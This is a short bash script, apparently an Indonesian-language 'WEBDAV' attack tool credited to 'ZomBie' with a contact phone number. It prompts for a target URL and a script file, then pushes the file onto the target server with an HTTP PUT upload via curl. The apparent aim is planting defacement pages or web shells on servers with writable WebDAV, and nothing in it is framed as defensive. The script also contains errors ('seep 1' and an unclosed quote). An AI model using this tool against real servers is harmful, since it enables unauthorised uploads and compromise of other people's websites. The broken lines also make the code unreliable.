clear
figlet '    WEBDAV' | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[          Tool by ZomBie         ]=====>" | lolcat
echo  "    <=====[  Concact Me : +6283821185782  ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
read -p "Masukan Target =>" target;
read -p "Masukan Nama Scriptnya =>" script;
sleep 1
echo "Proses.."
curl -T /sdcard/$script $target
seep 1
echo ' [*] => Selesai 
sleep 2
